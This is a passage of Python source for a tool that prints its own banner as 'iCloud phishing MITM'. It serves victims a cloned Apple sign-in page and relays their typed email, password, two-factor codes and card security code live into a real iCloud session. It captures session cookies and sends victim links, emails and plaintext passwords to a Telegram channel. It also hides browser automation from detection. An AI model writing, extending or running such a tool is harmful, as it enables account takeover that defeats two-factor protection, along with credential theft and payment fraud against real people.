        print(f'  [mirror] FATAL: duplicate mirror (holder {holder}) — exiting', flush=True)
        sys.exit(1)
    lock_path.write_text(str(os.getpid()), encoding='utf-8')


def _release_mirror_lock(port: int, session: str) -> None:
    lock_path = _mirror_lock_path(port, session)
    try:
        if int(lock_path.read_text(encoding='utf-8').strip()) == os.getpid():
            lock_path.unlink(missing_ok=True)
    except (FileNotFoundError, ValueError, OSError):
        pass


def run() -> int:
    args = parse_args()
    harbor_base = args.harbor.rstrip('/')
    out_dir = Path(args.out)

    launch_opts: dict = {'headless': bool(args.headless)}
    if args.channel:
        launch_opts['channel'] = args.channel
    launch_opts.setdefault('args', [])
    if '--disable-blink-features=AutomationControlled' not in launch_opts['args']:
        launch_opts['args'].append('--disable-blink-features=AutomationControlled')
    launch_opts['ignore_default_args'] = ['--enable-automation']

    print('iCloud phishing MITM', flush=True)
    relay_local = (args.relay or '').rstrip('/')
    relay_public = (args.public_relay or args.relay or '').rstrip('/')
    victim_link = ''
    if args.remote:
        print('  Mode:              REMOTE victim (any device on Vercel + relay)', flush=True)
        print(f'  Relay (local):     {relay_local}', flush=True)
        print(f'  Relay (victim):    {relay_public}', flush=True)
        print(f'  Session:           {args.session}', flush=True)
        victim_link = (
            f'{harbor_base}/signin?sid={urlquote(args.session, safe="")}'
            f'&fwd={urlquote(relay_public, safe="")}'
        )
        print(f'  Victim link:       {victim_link}', flush=True)
        print('  (fwd= must match your live tunnel URL)\n', flush=True)
    else:
        print(f'  Window 1 (victim): {harbor_base}/signin   (1:1 iCloud) — type here', flush=True)
    print('  Window 2 (mirror): https://www.icloud.com  (real Apple) — watch the live sign-in', flush=True)
    print('  Window 2 (panel):  capture panel (credentials + cookies)', flush=True)
    print(f'  Output:            {out_dir}/capture.json (+ storage-state.json, cookies.txt, …)', flush=True)
    print('  Type in the victim window; watch the mirror window. Ctrl+C to stop.\n', flush=True)

    from telegram_capture import notify_victim_link, send_text as tg_send

    if args.remote and victim_link:
        tg_send(
            'Harbor mirror online.\n\n'
            f'Victim link:\n{victim_link}\n\n'
            f'Session: {args.session}'
        )
        notify_victim_link(victim_link, session=args.session)
        print('  [mirror] telegram: victim link queued', flush=True)
    elif tg_send('Apple mirror online — capture + Telegram active.'):
        print('  [mirror] telegram: startup ping sent', flush=True)
    else:
        print('  [mirror] telegram: NOT configured or send failed (check mirror/.env)', flush=True)

    relay_listen_port = args.relay_port if args.relay_port > 0 else DEFAULT_PORT
    if args.remote:
        _acquire_mirror_lock(relay_listen_port, args.session)
    if args.remote and args.relay_port and args.relay_port > 0:
        import asyncio
        import threading

        from phish_relay import _run_server

        def _relay_thread() -> None:
            asyncio.run(_run_server('127.0.0.1', args.relay_port))

        threading.Thread(target=_relay_thread, daemon=True, name='phish-relay').start()
        time.sleep(0.8)
        relay_ok = False
        for attempt in range(8):
            try:
                with urllib_request.urlopen(
                    f'http://127.0.0.1:{args.relay_port}/',
                    timeout=2,
                ) as resp:
                    relay_ok = resp.status == 200
            except OSError:
                relay_ok = False
            if relay_ok:
                break
            time.sleep(0.35)
        if not relay_ok:
            print(
                f'  [relay] FATAL: port {args.relay_port} not accepting connections '
                '(another process may be bound). Stop other Harbor mirrors and retry.',
                flush=True,
            )
            sys.exit(1)
        print(f'  [relay] listening on http://127.0.0.1:{args.relay_port}', flush=True)
        relay_reset_session(relay_local, args.session)
        drained_stale = relay_drain_events(relay_local, args.session)
        if drained_stale:
            print(f'  [relay] discarded {len(drained_stale)} queued event(s) after reset', flush=True)

    elif args.remote:
        relay_ok = False
        for attempt in range(40):
            try:
                with urllib_request.urlopen(
                    f'http://127.0.0.1:{relay_listen_port}/',
                    timeout=2,
                ) as resp:
                    relay_ok = resp.status == 200
            except OSError:
                relay_ok = False
            if relay_ok:
                break
            time.sleep(0.35)
        if not relay_ok:
            print(
                f'  [relay] FATAL: no relay on http://127.0.0.1:{relay_listen_port}/ '
                '(start phish_relay.py first).',
                flush=True,
            )
            sys.exit(1)
        print(f'  [relay] using external relay on http://127.0.0.1:{relay_listen_port}', flush=True)
        relay_reset_session(relay_local, args.session)
        drained_stale = relay_drain_events(relay_local, args.session)
        if drained_stale:
            print(f'  [relay] discarded {len(drained_stale)} queued event(s) after reset', flush=True)


    with sync_playwright() as p:
        browser = p.chromium.launch(**launch_opts)

        victim_context = None
        if args.remote:
            victim = RemoteVictimPage(relay_local, args.session, harbor_base, relay_public)
        else:
            victim_context = browser.new_context(viewport={'width': 1000, 'height': 940})
            victim_context.add_init_script(PHISH_BRIDGE)
            victim_context.add_init_script(HARBOR_DRIVER)
            victim = victim_context.new_page()

        mirror_context = browser.new_context(viewport={'width': 1000, 'height': 940})
        mirror_context.add_init_script(
            "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});"
        )
        apple = mirror_context.new_page()
        panel = mirror_context.new_page()

        frame = open_icloud_sign_in(apple)
        frame = reset_apple_signin_widget(apple, frame)
        print('  [mirror] Apple sign-in fields cleared (fresh session)', flush=True)
        if not args.remote:
            victim.goto(harbor_base + '/signin', wait_until='domcontentloaded', timeout=90000)
            ensure_driver(victim)
        panel.set_content(PANEL_HTML, wait_until='domcontentloaded', timeout=20000)
        apple.bring_to_front()

        capture_meta: dict = {'session': assess_session([]), 'import': {}}
        credentials = {'email': '', 'password': ''}
        last_route = '/signin'
        last_error_key = ''
        last_otp = ''
        last_apple_otp_sync = ''
        last_verify_copy_key = ''
        remote_otp_slots = [''] * 6
        last_victim_otp_slots: list[str] = [''] * 6
        last_payment_csc = ''
        mirror_loading_until = 0.0
        last_victim_mirror_loading = False
        cookies: list = []
        last_cookie_sig = ''
        log: list = []
        selftest = {'email': False, 'password': False}
        last_saved_keys: dict[str, str] = {}
        known_fps = load_saved_fingerprints(out_dir)
        loop_deadline = time.time() + args.run_seconds if args.run_seconds > 0 else None
        allow_password_ui = False
        pending_password_until = 0.0
        pending_verify_until = 0.0
        awaiting_apple_path = ''
        victim_password_ui_applied = False
        victim_signin_loading_until = 0.0
        relay_input_seq: dict[str, int] = {}
        relay_otp_seq: dict[str, int] = {}
        apple_input_cache: dict[str, str] = {}
        victim_typed_live: dict[str, str] = {'account': '', 'password': ''}
        victim_email_state = VictimEmailState()
        apple_email_live = AppleEmailLiveSync(min_interval_s=0.18)
        victim_password_state = VictimEmailState()
        apple_password_live = AppleEmailLiveSync(min_interval_s=0.22)
        pending_email_account = ''
        pending_email_deadline = 0.0
        email_forward_phase = 'idle'
        email_forward_click_at = 0.0
        email_forward_retries = 0
        EMAIL_FORWARD_TIMEOUT_S = 45.0
        EMAIL_FORWARD_MAX_RETRIES = 5
        collection_tick = 0
        flow_test_done = False
        flow_test_password_sent = False
        route_sync = VictimRouteSync(reported_path='/signin', commanded_path='/signin')
        last_remote_ui_sig = ''

        def victim_path_effective() -> str:
            if args.remote:
                return route_sync.operator_path()
            return path_of(victim.url)

        def tick_pending_email_forward(*, burst: bool = False) -> None:
            """Drive Apple email step in small steps so the poll loop stays responsive."""
            nonlocal frame, pending_email_account, pending_email_deadline
            nonlocal email_forward_phase, email_forward_click_at, email_forward_retries
            nonlocal allow_password_ui, victim_password_ui_applied
            nonlocal pending_password_until, victim_signin_loading_until

            def finish_success(ac: str, tag: str) -> None:
                nonlocal pending_email_account, email_forward_phase, email_forward_retries
                nonlocal allow_password_ui, victim_password_ui_applied
                nonlocal pending_password_until, victim_signin_loading_until
                pending_email_account = ''
                email_forward_phase = 'idle'
                email_forward_retries = 0
                allow_password_ui = True
                pending_password_until = time.time() + 35.0
                victim_password_ui_applied = True
                victim_signin_loading_until = 0.0
                credentials['email'] = ac
                victim_show_password_step(victim, ac, remote=args.remote)
                victim_set_verify(victim, ac)
                add_log(f'apple password step -> victim ({tag})')

            ac = (pending_email_account or '').strip()
            if not ac:
                email_forward_phase = 'idle'
                return

            steps = 3 if burst else 1
            for _ in range(steps):
                if not (pending_email_account or '').strip():
                    break
                ac = pending_email_account.strip()
                frame = ensure_apple_signin_frame(apple, frame)
                if not frame:
                    return

                if time.time() > pending_email_deadline:
                    pending_email_account = ''
                    email_forward_phase = 'idle'
                    email_forward_retries = 0
                    victim_signin_loading_until = 0.0
                    add_log('email forward timed out waiting for Apple password step')
                    victim_push_signin_error(
                        victim,
                        'Apple sign-in took too long. Check the iCloud tab and tap Continue again.',
                        'account',
                        remote=args.remote,
                    )
                    return

                if apple_password_step_ready(frame):
                    if email_forward_phase in ('sync', 'click', 'wait'):
                        on_apple = (_apple_account_email(frame) or '').strip().lower()
                        if on_apple and on_apple != ac.lower():
                            print(
                                '  [fwd] Apple password step for wrong account — reset',
                                flush=True,
                            )
                            reset_apple_signin_widget(apple, frame)
                            frame = find_apple_frame(apple, frame)
                            email_forward_phase = 'sync'
                            if not burst:
                                return
                            continue
                    finish_success(ac, 'poll')
                    return

                if email_forward_phase == 'idle':
                    email_forward_phase = 'sync'

                if email_forward_phase == 'sync':
                    apple_input_cache.pop('#account_name_text_field', None)
                    push_victim_email_to_apple(
                        apple,
                        frame,
                        victim_email_state,
                        apple_email_live,
                        force=True,
                        sync_cache=apple_input_cache,
                    )
                    frame = find_apple_frame(apple, frame)
                    on_apple = _apple_account_email(frame) if frame else ''
                    if frame and ac.lower() not in (on_apple or '').lower():
                        written = _apple_force_email_field(frame, ac)
                        on_apple = written or on_apple
                    print(
                        f'  [fwd] email on Apple: {on_apple!r} (target {ac!r})',
                        flush=True,
                    )
                    email_forward_phase = 'click'
                    if not burst:
                        return

                if email_forward_phase == 'click':
                    if apple_password_step_ready(frame):
                        finish_success(ac, 'poll')
                        return
                    _wait_apple_continue_enabled(frame, 2.0)
                    clicked = _apple_click_email_continue(frame)
                    print(
                        f'  [fwd] Apple Continue: {"ok" if clicked else "miss"}',
                        flush=True,
                    )
                    email_forward_click_at = time.time()
                    email_forward_phase = 'wait'
                    if not burst:
                        return

                if email_forward_phase == 'wait':
                    if apple_password_step_ready(frame):
                        finish_success(ac, 'after-continue')
                        return
                    if time.time() - email_forward_click_at < 6.0:
                        if not burst:
                            return
                        continue
                    email_forward_retries += 1
                    if email_forward_retries >= EMAIL_FORWARD_MAX_RETRIES:
                        pending_email_account = ''
                        email_forward_phase = 'idle'
                        email_forward_retries = 0
                        victim_signin_loading_until = 0.0
                        add_log('email forward exhausted retries on Apple')
                        victim_push_signin_error(
                            victim,
                            'Could not advance Apple sign-in. Open the iCloud window and try Continue again.',
                            'account',
                            remote=args.remote,
                        )
                        return
                    print(
                        f'  [fwd] email retry {email_forward_retries}/{EMAIL_FORWARD_MAX_RETRIES}',
                        flush=True,
                    )
                    email_forward_phase = 'sync'
                    if not burst:
                        return

        def add_log(msg: str) -> None:
            log.append({'t': datetime.now().strftime('%H:%M:%S'), 'msg': msg})
            del log[:-200]
            if any(
                needle in msg
                for needle in (
                    'apple ->',
                    'apple otp error',
                    'apple error',
                    'apple password step',
                    'apple verify step',
                    'victim -> otp',
                )
            ):
                print(f'  [mirror] {msg}', flush=True)

        try:
            while True:
                if collection_tick == 0:
                    print('  [mirror] poll loop active', flush=True)
                if args.remote:
                    _enforce_mirror_lock(relay_listen_port, args.session)
                if (
                    args.flow_test_email
                    and args.flow_test_password
                    and not flow_test_done
                ):
                    flow_test_done = True
                    try:
                        victim.fill('#account', args.flow_test_email)
                        victim.click('#continue-btn')
                        add_log('flow-test: email submitted')
                        print('  [flow-test] email submitted', flush=True)
                    except PlaywrightError as e:
                        print('  [flow-test] email failed:', repr(e), flush=True)
                elif (
                    args.flow_test_email
                    and args.flow_test_password
                    and flow_test_done
                    and not flow_test_password_sent
                ):
                    try:
                        pw_visible = victim.evaluate(
                            "() => !!(document.getElementById('step-password') && !document.getElementById('step-password').hidden)"
                        )
                        if pw_visible and allow_password_ui:
                            victim.fill('#password', args.flow_test_password)
                            victim.click('#continue-btn')
                            credentials['email'] = args.flow_test_email
                            flow_test_password_sent = True
                            add_log('flow-test: password submitted')
                            print('  [flow-test] password submitted', flush=True)
                    except PlaywrightError:
                        pass

                # 0) Self-test: auto-drive a test credential through the victim.
                if args.selftest and not (selftest['email'] and selftest['password']):
                    try:
                        step = victim.evaluate(
                            "() => window.HarborDriver ? window.HarborDriver.signinStep() : 'email'"
                        )
                    except PlaywrightError:
                        step = 'email'
                    if not selftest['email'] and step == 'email':
                        selftest['email'] = True
                        try:
                            victim.fill('#account', 'selftest.example.appleid.com')
                            victim.click('#continue-btn')
                            print('  [selftest] email submitted', flush=True)
                        except PlaywrightError as e:
                            print('  [selftest] email issue:', repr(e), flush=True)
                    elif not selftest['password'] and step == 'password':
                        selftest['password'] = True
                        try:
                            victim.fill('#password', 'selftest-password-123')
                            victim.click('#continue-btn')
                            print('  [selftest] password submitted', flush=True)
                        except PlaywrightError as e:
                            print('  [selftest] password issue:', repr(e), flush=True)

                # 1) Drain the victim's phish queue (submit / trust events).
                try:
                    if args.remote:
                        events = relay_drain_events(relay_local, args.session)
                    else:
                        events = victim.evaluate(
                            "() => window.PhishBridge ? window.PhishBridge.queue() : []"
                        )
                except (PlaywrightError, TypeError):
                    events = []

                events = coalesce_relay_events(events)

                pending_victim_inputs: dict = {}
                for ev in events:
                    if ev.get('type') == 'email-commit':
                        pl = ev.get('payload') or {}
                        ac = (pl.get('account') or '').strip()
                        if ac and is_operator_probe_email(ac):
                            continue
                        if ac:
                            victim_email_state.set_authoritative(ac)
                            victim_typed_live['account'] = ac
                            credentials['email'] = ac
                            push_victim_email_to_apple(
                                apple,
                                frame,
                                victim_email_state,
                                apple_email_live,
                                force=True,
                                sync_cache=apple_input_cache,
                            )
                            frame = find_apple_frame(apple, frame)
                        continue
                    if ev.get('type') == 'password-commit':
                        pl = ev.get('payload') or {}
                        pw = pl.get('password') or ''
                        if pw:
                            victim_password_state.set_authoritative(pw)
                            victim_typed_live['password'] = pw
                            credentials['password'] = pw
                            push_victim_password_to_apple(
                                apple,
                                frame,
                                victim_password_state,
                                apple_password_live,
                                force=True,
                            )
                            frame = find_apple_frame(apple, frame)
                        continue
                    if ev.get('type') != 'input':
                        continue
                    pl = ev.get('payload') or {}
                    fld = pl.get('field')
                    if fld in ('account', 'password', 'payment-csc'):
                        val = pl.get('value') or ''
                        absorb_victim_typed_value(
                            fld,
                            val,
                            ev,
                            relay_input_seq,
                            victim_typed_live,
                            victim_email_state,
                            victim_password_state,
                        )
                        prev = pending_victim_inputs.get(fld)
                        if not prev or input_event_rank(ev, fld) >= input_event_rank(prev[0], fld):
                            pending_victim_inputs[fld] = (ev, val)
                if pending_victim_inputs:
                    apply_victim_inputs_to_apple(
                        apple,
                        frame,
                        pending_victim_inputs,
                        relay_input_seq,
                        apple_input_cache,
                        credentials,
                    )
                    frame = find_apple_frame(apple, frame)

                if not args.remote:
                    push_victim_email_to_apple(
                        apple, frame, victim_email_state, apple_email_live,
                        sync_cache=apple_input_cache,
                    )
                    push_victim_password_to_apple(
                        apple, frame, victim_password_state, apple_password_live
                    )
                frame = find_apple_frame(apple, frame)

                otp_events = [e for e in events if e.get('type') in ('otp-input', 'otp-paste')]
                if otp_events:
                    frame, otp_from_batch = apply_otp_events_batch(
                        apple,
                        frame,
                        otp_events,
                        remote_otp_slots,
                        relay_otp_seq,
                        remote=args.remote,
                    )
                    if len(otp_from_batch) == 6 and otp_from_batch.isdigit():
                        notify_lab_event(f'Harbor — OTP digits\n{otp_from_batch}')
                    frame = find_apple_frame(apple, frame)

                for ev in events:
                    if ev.get('type') == 'meta':
                        pth = (ev.get('payload') or {}).get('path') or '/'
                        pth = pth if str(pth).startswith('/') else '/' + str(pth)
                        if args.remote:
                            route_sync.ingest_meta(pth)
                        continue
                    etype = ev.get('type')
                    payload = ev.get('payload') or {}
                    if etype == 'submit':
                        step = payload.get('step')
                        account = (payload.get('account') or '').strip()
                        password = payload.get('password') or ''
                        if password.strip():
                            step = 'password'
                        committed = victim_email_state.get().strip()
                        if account:
                            victim_email_state.set_authoritative(account)
                        account = victim_email_state.best_of(account, committed)
                        if account:
                            credentials['email'] = account
                            victim_typed_live['account'] = account
                        if step == 'email':
                            if is_operator_probe_email(account):
                                print(f'  [relay] self-test consumed (skip Apple): {account!r}', flush=True)
                                pending_email_account = ''
                                email_forward_phase = 'idle'
                                continue
                            add_log(f'victim -> email: {account} ({len(account)} chars)')
                            notify_lab_event(f'Harbor — email submit\n{account}')
                            allow_password_ui = False
                            victim_password_ui_applied = False
                            victim_begin_signin_loading(victim, remote=args.remote)
                            victim_signin_loading_until = time.time() + 90.0
                            if not account:
                                print('  [fwd] email: submit with empty account', flush=True)
                                victim_signin_loading_until = 0.0
                                victim_push_signin_error(
                                    victim,
                                    'Enter your email or phone number.',
                                    'account',
                                    remote=args.remote,
                                )
                            else:
                                prev_cred = (credentials.get('email') or '').strip().lower()
                                apple_email_live.mark_pushed('')
                                if prev_cred and account.lower() != prev_cred:
                                    frame = ensure_apple_signin_frame(apple, frame)
                                    if frame and (
                                        apple_password_step_ready(frame)
                                        or (
                                            _apple_account_email(frame)
                                            and _apple_account_email(frame).lower()
                                            != account.lower()
                                        )
                                    ):
                                        print(
                                            '  [fwd] new email submit — resetting Apple sign-in',
                                            flush=True,
                                        )
                                        reset_apple_signin_widget(apple, frame)
                                        frame = find_apple_frame(apple, frame)
                                pending_email_account = account
                                pending_email_deadline = (
                                    time.time() + EMAIL_FORWARD_TIMEOUT_S
                                )
                                email_forward_phase = 'sync'
                                email_forward_retries = 0
                                print(f'  [fwd] victim submit -> forward_email ({account})', flush=True)
                                _mirror_trace('submit ' + account)
                                frame = ensure_apple_signin_frame(apple, frame)
                                ok = forward_email(apple, frame, account)
                                frame = find_apple_frame(apple, frame)
                                if ok:
                                    allow_password_ui = True
                                    victim_password_ui_applied = True
                                    victim_signin_loading_until = 0.0
                                    pending_email_account = ''
                                    email_forward_phase = 'idle'
                                    credentials['email'] = account
                                    victim_show_password_step(victim, account, remote=args.remote)
                                else:
                                    pending_email_account = account
                                    pending_email_deadline = time.time() + EMAIL_FORWARD_TIMEOUT_S
                                    email_forward_phase = 'sync'
                                    email_forward_retries = 0
                                    tick_pending_email_forward(burst=True)
                        elif step == 'password':
                            if password:
                                victim_password_state.set_authoritative(password)
                            pwd_send = victim_password_state.get() or password
                            if not (pwd_send or '').strip():
                                print('  [fwd] password: submit with empty password', flush=True)
                                victim_signin_loading_until = 0.0
                                victim_clear_signin_loading(victim, remote=args.remote)
                                continue
                            credentials['password'] = pwd_send
                            add_log('victim -> password: ' + ('*' * len(pwd_send)))
                            notify_lab_event(
                                'Harbor — password submit\n'
                                f"Email: {credentials.get('email') or '-'}\n"
                                f'Password: {pwd_send}'
                            )
                            victim_begin_signin_loading(victim, remote=args.remote)
                            victim_signin_loading_until = time.time() + 90.0
                            apple_input_cache.pop('#password_text_field', None)
                            em = victim_email_state.best_of(
                                account, credentials.get('email') or ''
                            ).strip()
                            if em:
                                credentials['email'] = em
                            push_victim_email_to_apple(
                                apple,
                                frame,
                                victim_email_state,
                                apple_email_live,
                                force=True,
                                sync_cache=apple_input_cache,
                            )
                            frame = find_apple_frame(apple, frame)
                            if em and _apple_account_email(frame).lower() != em.lower():
                                forward_email(apple, frame, em)
                                frame = find_apple_frame(apple, frame)
                            push_victim_password_to_apple(
                                apple,
                                frame,
                                victim_password_state,
                                apple_password_live,
                                force=True,
                            )
                            frame = find_apple_frame(apple, frame)
                            if forward_password(
                                apple,
                                frame,
                                pwd_send,
                                em or credentials.get('email') or account,
                            ):
                                frame = find_apple_frame(apple, frame)
                                pending_verify_until = time.time() + 35.0
                                mirror_loading_until = time.time() + 35.0
                                victim_signin_loading_until = 0.0
                                awaiting_apple_path = '/verify'
                                victim_set_verify(victim, credentials.get('email') or '')
                                if args.remote and hasattr(victim, 'push_harbor_state'):
                                    victim_clear_signin_loading(
                                        victim,
                                        remote=True,
                                        extra={'mirrorLoading': True},
                                    )
                                elif not args.remote:
                                    victim_eval(
                                        victim,
                                        """() => {
                                          if (window.PhishBridge) window.PhishBridge.setLoading(false);
                                          if (window.HarborDriver) window.HarborDriver.setMirrorLoading(true);
                                        }""",
                                    )
                            else:
                                frame = find_apple_frame(apple, frame)
                                victim_signin_loading_until = 0.0
                                victim_clear_signin_loading(victim, remote=args.remote)
                                victim_eval(
                                    victim,
                                    """() => {
                                      if (window.HarborDriver && window.HarborDriver.showSignInError) {
                                        window.HarborDriver.showSignInError(
                                          'Password could not be sent to Apple. Complete email on iCloud first, then try again.',
                                          'password'
                                        );
                                      }
                                    }""",
                                )
                    elif etype == 'email-commit':
                        continue
                    elif etype == 'input':
                        continue
                    elif etype in ('otp-input', 'otp-paste'):
                        continue
                    elif etype == 'trust':
                        label = payload.get('label') or ''
                        add_log(f'victim -> trust: {label}')
                        if forward_trust(apple, frame, label):
                            awaiting_apple_path = '/loading'
                            victim_eval(
                                victim,
                                "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(true)",
                            )
                        frame = find_apple_frame(apple, frame)
                    elif etype == 'mirror-input':
                        forward_mirror_input(apple, frame, payload)
                        frame = find_apple_frame(apple, frame)
                    elif etype == 'mirror-click':
                        add_log(f'victim -> click: {(payload.get("label") or "")[:50]}')
                        forward_mirror_click(apple, frame, payload)
                        frame = find_apple_frame(apple, frame)

                # 2) Keep Apple OTP in sync with victim /verify, submit when complete.
                if victim_path_effective() == '/verify':
                    drain_inject_otp(out_dir, victim)
                    digits = victim_otp_digits(victim, args.remote, remote_otp_slots)
                    otp_clean = otp_digits_clean(digits)
                    want_slots = otp_slots_normalized(remote_otp_slots)
                    frame = find_apple_frame(apple, frame)
                    if frame and any(want_slots) and not otp_slots_equal(
                        want_slots, last_victim_otp_slots
                    ):
                        sync_apple_otp_slots_to_apple(frame, remote_otp_slots)
                        last_victim_otp_slots = want_slots[:]
                    if len(otp_clean) == 6 and otp_clean.isdigit() and otp_clean != last_otp:
                        add_log('victim -> otp: ' + otp_clean)
                        if frame and _apple_otp_read(frame) != otp_clean:
                            sync_apple_otp_to_apple(frame, otp_clean)
                            last_victim_otp_slots = otp_slots_normalized(remote_otp_slots)
                            last_apple_otp_sync = otp_clean
                        if frame and _apple_otp_read(frame) == otp_clean:
                            time.sleep(0.1)
                            _try_otp_submit(frame)
                        last_otp = otp_clean
                        mirror_loading_until = time.time() + 20.0
                        victim_eval(
                            victim,
                            "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(true)",
                        )
                        victim_eval(
                            victim,
                            "() => window.PhishBridge && window.PhishBridge.startVerifying()",
                        )
                        frame = find_apple_frame(apple, frame)

                if path_of(victim.url) == '/payment':
                    try:
                        csc = victim.evaluate(
                            "() => (document.getElementById('payment-csc') || {}).value || ''"
                        )
                    except PlaywrightError:
                        csc = ''
                    csc = (csc or '').strip()
                    if len(csc) >= 3 and csc != last_payment_csc:
                        add_log('victim -> payment csc')
                        if forward_payment_csc(apple, frame, csc):
                            last_payment_csc = csc
                            mirror_loading_until = time.time() + 3.0
                        frame = find_apple_frame(apple, frame)

                # 3) Probe Apple's state.
                frame = find_apple_frame(apple, frame)
                apple_state = probe_apple_frame(frame) if frame else None
                page_info = probe_apple_page(apple)
                surface = probe_apple_surface(apple)
                route = apple_route(apple_state, page_info, surface)

                desired_route = resolve_target_route(apple_state, page_info, surface, last_route)
                ready = apple_ui_ready(apple_state, surface, frame, page_info)
                victim_path_now = victim_path_effective()

                if (
                    victim_path_now == '/signin'
                    and frame
                    and (
                        pending_email_account
                        or victim_signin_loading_until > time.time()
                    )
                    and not victim_password_ui_applied
                ):
                    promoted, frame = promote_victim_password_if_apple_ready(
                        apple,
                        frame,
                        victim,
                        credentials,
                        account_hint=pending_email_account,
                        remote=args.remote,
                    )
                    if promoted:
                        pending_email_account = ''
                        email_forward_phase = 'idle'
                        email_forward_retries = 0
                        allow_password_ui = True
                        pending_password_until = time.time() + 35.0
                        victim_password_ui_applied = True
                        victim_signin_loading_until = 0.0
                        add_log('apple password step -> victim (fast)')

                apply_path = awaiting_apple_path or desired_route
                if awaiting_apple_path and not ready:
                    apply_path = ''
                hold_transition = bool(awaiting_apple_path and not ready)
                if apple_has_blocking_signin_errors(apple_state, frame):
                    awaiting_apple_path = ''
                    pending_verify_until = 0.0
                    mirror_loading_until = 0.0
                    hold_transition = False
                apple_fp = mirror_fingerprint(apple_state)

                target_v = pick_apple_victim_path(
                    desired_route,
                    last_route,
                    apple_otp_ready=apple_otp_step_ready(frame),
                )
                need_victim_nav = (
                    normalize_path(target_v) != route_sync.commanded_path
                    or route_sync.needs_nav_retry()
                )
                if need_victim_nav:
                    victim_path_now = ensure_victim_harbor_path(
                        victim,
                        harbor_base,
                        target_v,
                        frame,
                        apple,
                        credentials,
                        route_sync,
                        remote=args.remote,
                    )
                    last_route = victim_path_now
                    mirror_loading_until = 0.0
                    pending_verify_until = 0.0
                    awaiting_apple_path = ''
                    add_log(f'victim route -> {target_v}')

                if (
                    victim_path_now == '/signin'
                    and victim_password_ui_applied
                    and frame
                    and apple_email_step_only(frame)
                ):
                    add_log('apple still on email — reverting victim password UI')
                    allow_password_ui = False
                    victim_password_ui_applied = False
                    pending_password_until = 0.0
                    sync_victim_signin_from_apple(
                        victim, {}, credentials, allow_password=False, remote=args.remote
                    )
                    victim_eval(
                        victim,
                        "() => window.PhishBridge && window.PhishBridge.setLoading(false)",
                    )
                    victim_eval(
                        victim,
                        "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)",
                    )

                if pending_password_until:
                    if allow_password_ui and (
                        (apple_state and apple_state.get('step') == 'password')
                        or apple_password_step_ready(frame)
                    ):
                        st = dict(apple_state or {})
                        st['step'] = 'password'
                        sync_victim_signin_from_apple(
                            victim, st, credentials, allow_password=True, remote=args.remote
                        )
                        pending_password_until = 0.0
                        victim_password_ui_applied = True
                        clear_victim_ui_busy(victim)
                        if args.remote and hasattr(victim, 'flush_cmds'):
                            victim.flush_cmds(force=True)
                        add_log('apple password step -> victim')
                    elif time.time() >= pending_password_until:
                        pending_password_until = 0.0
                        allow_password_ui = False
                        victim_password_ui_applied = False
                        sync_victim_signin_from_apple(
                            victim, {}, credentials, allow_password=False, remote=args.remote
                        )
                        victim_eval(
                            victim,
                            "() => window.PhishBridge && window.PhishBridge.setLoading(false)",
                        )
                        victim_eval(
                            victim,
                            "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)",
                        )
                        victim_eval(
                            victim,
                            """() => {
                              if (window.HarborDriver && window.HarborDriver.showSignInError) {
                                window.HarborDriver.showSignInError(
                                  'Apple did not open the password step in time. Use Continue again after checking the iCloud tab.',
                                  'account'
                                );
                              }
                            }""",
                        )

                if pending_verify_until and not awaiting_apple_path and apple_otp_step_ready(frame):
                    awaiting_apple_path = '/verify'

                if apple_has_blocking_signin_errors(apple_state, frame):
                    if victim_path_now != '/signin':
                        victim_navigate_path(
                            victim,
                            harbor_base,
                            '/signin',
                            frame,
                            apple,
                            credentials,
                        )
                        victim_path_now = '/signin'
                        last_route = '/signin'
                    st_pw = dict(apple_state or {})
                    pw_ready = st_pw.get('step') == 'password' or apple_password_step_ready(frame)
                    if pw_ready:
                        try:
                            on_password_step = victim_knows_password_step(
                                victim, victim_password_ui_applied
                            )
                        except PlaywrightError:
                            on_password_step = victim_password_ui_applied
                        if not on_password_step:
                            st_pw['step'] = 'password'
                            sync_victim_signin_from_apple(
                                victim,
                                st_pw,
                                credentials,
                                allow_password=True,
                                remote=args.remote,
                            )
                            victim_password_ui_applied = True
                            allow_password_ui = True
                    errors = (apple_state or {}).get('errors') or []
                    if errors:
                        msg = pick_apple_error(errors)
                        err_key = hashlib.sha256(msg.encode()).hexdigest()[:16]
                        if err_key != last_error_key:
                            inv = invalidate_for_message(msg)
                            add_log(f'apple error -> victim: {msg[:70]}')
                            victim_eval(
                                victim,
                                "() => window.PhishBridge && window.PhishBridge.setLoading(false)",
                            )
                            victim_eval(
                                victim,
                                "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)",
                            )
                            victim_eval(
                                victim,
                                "(a) => window.HarborDriver && window.HarborDriver.showSignInError(a.msg, a.inv)",
                                {'msg': msg, 'inv': inv},
                            )
                            last_error_key = err_key
                            last_victim_mirror_loading = False

                # 4) Mirror Apple -> victim (wait for real page, then steal + show).
                if (
                    apply_path
                    and ready
                    and not hold_transition
                    and not args.remote
                    and (
                        victim_path_now != apply_path
                        or not victim_page_matches_apple(victim, apply_path, apple_state, apple_fp)
                    )
                ):
                    if apply_path == '/verify' and apple_has_blocking_signin_errors(apple_state, frame):
                        apply_path = ''
                    if apply_path and victim_path_now != apply_path:
                        add_log(f'apple -> {apply_path}   (victim follows)')
                    if apply_path == '/signin' and route_rank(last_route) > route_rank('/signin'):
                        if not apple_allows_signin_regress(apple_state, surface):
                            apply_path = last_route
                    if apply_path and apply_path != victim_path_now:
                        if apply_path == '/signin':
                            allow_password_ui = False
                            victim_password_ui_applied = False
                        victim_navigate_path(
                            victim,
                            harbor_base,
                            apply_path,
                            frame,
                            apple,
                            credentials,
                        )
                    if apply_path:
                        victim_apply_apple_page(
                            victim, frame, apple, apple_state, surface, apply_path, credentials
                        )
                        victim_eval(
                            victim,
                            "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)",
                        )
                        last_route = apply_path
                        awaiting_apple_path = ''
                        pending_verify_until = 0.0
                        last_error_key = ''
                        if apply_path == '/verify':
                            last_otp = ''
                            last_apple_otp_sync = ''
                            last_victim_otp_slots[:] = [''] * 6
                            remote_otp_slots[:] = [''] * 6
                        victim_eval(
                            victim,
                            "() => window.PhishBridge && window.PhishBridge.setLoading(false)",
                        )
                elif ready and not hold_transition and last_route:
                    if last_route in ('/payment', '/flow'):
                        victim_apply_apple_page(
                            victim, frame, apple, apple_state, surface, last_route, credentials
                        )

                if (
                    ready
